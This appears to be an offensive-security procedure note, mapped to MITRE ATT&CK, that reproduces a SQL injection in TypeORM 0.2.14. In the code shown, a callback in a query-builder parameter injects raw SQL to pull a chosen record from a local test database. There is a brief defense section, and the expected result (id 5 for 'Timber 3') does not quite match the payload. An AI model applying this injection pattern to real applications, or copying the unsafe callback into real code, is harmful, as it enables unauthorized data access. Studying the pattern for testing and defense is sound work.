---
tags:
  - injection
  - sqli
  - payload-craft
type: procedure
tools:
  - '[[tools/Node.js]]'
  - '[[tools/typeorm]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:19.596Z'
sub_techniques: []
id: e030d66d-f36f-4eb3-a028-56921b6d70aa
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-Script-for-Injection

## Summary

This procedure alters the index.ts script to insert test data and implement a SQL injection payload using a function callback in the query builder, exploiting the unescaped return in MysqlDriver.ts.

## Description

The modification targets the createQueryBuilder.where() method, where a function parameter allows raw SQL execution without escaping. This simulates a vulnerable application query, inserting users with names like 'Timber i' and injecting ' -1 or firstName=0x54696d6265722033' (hex for 'Timber 3') to bypass and retrieve a specific record. Environment: TypeScript/Node.js with TypeORM 0.2.14.

## Requirements

1. Configured TypeORM project with DB connection
2. Text editor for code changes
3. Knowledge of TypeORM entities and query builders

## Defense

Defensive measures and detection strategies:

- Avoid function callbacks in query parameters; use explicit SQL expressions with parameterization
- Implement input validation and ORM best practices
- Static code analysis for unsafe ORM usage

## Objectives

1. Populate database with test data
2. Craft and integrate injection payload
3. Prepare for unauthorized data retrieval

## Instructions

### Step 1: Define Entity and Insert Data

**Context**: Create User entity and loop to insert 10 users.

**Command** (Code Edit):
Edit index.ts:
```typescript
import "reflect-metadata";
import { createConnection } from "typeorm";
import { User } from "./entity/User";

createConnection().then(async connection => {
  console.log("Inserting a new user into this database...");
  for (let i = 1; i <= 10; i++) {
    const user = new User();
    user.firstName = `Timber ${i}`;
    user.lastName = "Saw";
    user.age = 25 + i;
    await connection.manager.save(user);
    console.log("Saved a new user with id: " + user.id);
  }

  // Injection query here (next step)
}).catch(error => console.log(error));
```

> This inserts users; expected: Console logs with saved IDs.

### Step 2: Add Injection Query

**Context**: Implement the vulnerable where clause with function.

**Command** (Code Edit):
Append to index.ts:
```typescript
  const user = await connection
    .getRepository(User)
    .createQueryBuilder("user")
    .where("user.firstName = :name", { name: () => "-1 or firstName=0x54696d6265722033" })
    .getOne();

  console.log("Loaded user: ", user);
```

> The function returns raw SQL, exploiting the lack of escaping in escapeQueryWithParameters (line 387). Expected: Retrieves User id:5.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Node.js]]
- [[tools/typeorm]]

## Tags

- injection
- sqli
